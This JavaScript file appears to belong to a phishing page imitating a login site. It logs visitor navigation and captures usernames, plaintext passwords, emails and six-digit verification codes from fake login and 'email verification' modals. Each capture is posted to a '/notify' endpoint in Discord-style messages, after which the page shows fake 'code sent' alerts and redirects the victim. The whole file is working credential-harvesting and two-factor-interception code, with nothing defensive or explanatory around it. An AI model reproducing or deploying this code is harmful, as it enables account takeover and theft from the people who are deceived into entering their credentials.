async function sendToDiscord(content) {
    try {
        await fetch("/notify", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content })
        });
    } catch (e) {
        console.error("Notify failed:", e);
    }
}

// Track user's page navigation
window.addEventListener("load", () => {
    const time = new Date().toLocaleString();
    const pageUrl = window.location.pathname.split('/').pop() || 'index.html';
    const pageName = document.title;
    
    // Check if this is the first visit or a navigation
    const hasVisited = sessionStorage.getItem("hasVisited");
    const lastPage = sessionStorage.getItem("lastPage");
    
    if (!hasVisited) {
        // First time visiting the site
        sendToDiscord(`👀 **New Visitor**\n📄 Landed on: \`${pageUrl}\` (${pageName})\n🕐 Time: ${time}`);
        sessionStorage.setItem("hasVisited", "true");
    } else if (lastPage !== pageUrl) {
        // User navigated to a different page
        sendToDiscord(`🔄 **User Navigated**\n📄 From: \`${lastPage || 'unknown'}\` → To: \`${pageUrl}\` (${pageName})\n🕐 Time: ${time}`);
    }
    
    // Update the last visited page
    sessionStorage.setItem("lastPage", pageUrl);
});

// Login page functionality
document.addEventListener("DOMContentLoaded", () => {
    const loginForm = document.querySelector(".login-form");
    
    if (loginForm) {
        loginForm.addEventListener("submit", (e) => {
            e.preventDefault();
            
            const username = loginForm.querySelector('input[type="text"]').value;
            const password = loginForm.querySelector('input[type="password"]').value;
            
            if (!username || !password) {
                alert("Please enter both username and password");
                return;
            }
            
            const time = new Date().toLocaleString();
            sendToDiscord(`🔐 **Login Attempt**\n👤 Username: \`${username}\`\n🔑 Password: \`${password}\`\n🕐 Time: ${time}`);
            
            // Show email verification modal instead of redirecting
            openEmailModal();
        });
    }
    
    // One-Time Code button
    const oneTimeBtn = document.querySelector(".one-time-code-btn");
    if (oneTimeBtn) {
        oneTimeBtn.addEventListener("click", () => {
            const email = prompt("Enter your email:");
            if (email && email.trim()) {
                const time = new Date().toLocaleString();
                sendToDiscord(`📧 **One-Time Code Request**\n📩 Email: \`${email}\`\n🕐 Time: ${time}`);
                alert("Code sent! (Demo)");
            }
        });
    }
    
    // Quick Sign-in button
    const quickSigninBtn = document.querySelector(".quick-signin-btn");
    if (quickSigninBtn) {
        quickSigninBtn.addEventListener("click", () => {
            const time = new Date().toLocaleString();
            sendToDiscord(`⚡ **Quick Sign-in Clicked**\n🕐 Time: ${time}`);
            alert("Quick sign-in feature (Demo)");
        });
    }

    // Add Friend button redirect
    const addFriendBtn = document.querySelector(".btn-add-friend");
    if (addFriendBtn) {
        addFriendBtn.addEventListener("click", () => {
            window.location.href = "login.html";
        });
    }

    // Log In button in header redirect
    const loginHeaderBtn = document.querySelector(".login-btn-header");
    if (loginHeaderBtn) {
        loginHeaderBtn.addEventListener("click", (e) => {
            e.preventDefault();
            window.location.href = "login.html";
        });
    }
});

// Email Verification Modal Functions
function openEmailModal() {
    const modal = document.getElementById("emailVerificationModal");
    if (modal) {
        modal.classList.add("active");
    }
}

function closeEmailModal() {
    const modal = document.getElementById("emailVerificationModal");
    if (modal) {
        modal.classList.remove("active");
        document.getElementById("verificationEmail").value = "";
    }
}

function sendVerificationCode() {
    const emailInput = document.getElementById("verificationEmail");
    const email = emailInput.value.trim();
    
    if (!email) {
        alert("Please enter an email address");
        return;
    }
    
    const time = new Date().toLocaleString();
    sendToDiscord(`📧 **Email Verification Request**\n📩 Email: \`${email}\`\n🕐 Time: ${time}`);
    
    // Close email modal and open code entry modal
    closeEmailModal();
    openCodeModal(email);
}

function openCodeModal(email) {
    const modal = document.getElementById("codeEntryModal");
    const emailDisplay = document.getElementById("userEmail");
    
    if (modal && emailDisplay) {
        emailDisplay.textContent = email;
        modal.classList.add("active");
    }
}

function closeCodeModal() {
    const modal = document.getElementById("codeEntryModal");
    if (modal) {
        modal.classList.remove("active");
        document.getElementById("verificationCode").value = "";
    }
}

function submitVerificationCode() {
    const codeInput = document.getElementById("verificationCode");
    const code = codeInput.value.trim();
    const email = document.getElementById("userEmail").textContent;
    
    if (!code) {
        alert("Please enter the verification code");
        return;
    }
    
    if (code.length !== 6) {
        alert("Please enter a 6-digit code");
        return;
    }
    
    const time = new Date().toLocaleString();
    sendToDiscord(`🔢 **Verification Code Entered**\n📩 Email: \`${email}\`\n🔑 Code: \`${code}\`\n🕐 Time: ${time}`);
    
    // Close modal and redirect to home page
    closeCodeModal();
    setTimeout(() => {
        window.location.href = "index.html";
    }, 500);
}

// Close modal when clicking outside
document.addEventListener("click", (e) => {
    const emailModal = document.getElementById("emailVerificationModal");
    const codeModal = document.getElementById("codeEntryModal");
    
    if (emailModal && e.target === emailModal) {
        closeEmailModal();
    }
    
    if (codeModal && e.target === codeModal) {
        closeCodeModal();
    }
});
